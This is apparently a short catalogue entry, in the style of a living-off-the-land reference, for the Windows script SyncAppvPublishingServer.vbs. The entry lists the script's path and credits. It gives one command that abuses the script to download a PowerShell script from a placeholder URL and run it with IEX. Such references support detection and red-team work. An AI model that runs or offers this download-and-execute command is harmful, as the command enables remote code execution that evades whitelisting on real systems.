## SyncAppvPublishingServer.vbs
* Functions: Execute
```

SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX"
Inject PowerShell script code with the provided arguments
```
   
* Resources:   
  * https://twitter.com/monoxgas/status/895045566090010624
  * https://twitter.com/subTee/status/855738126882316288
   
* Full path:   
  * C:\Windows\System32\SyncAppvPublishingServer.vbs
   
* Notes: Thanks to Nick Landers - @monoxgas, Casey Smith - @subTee  
   
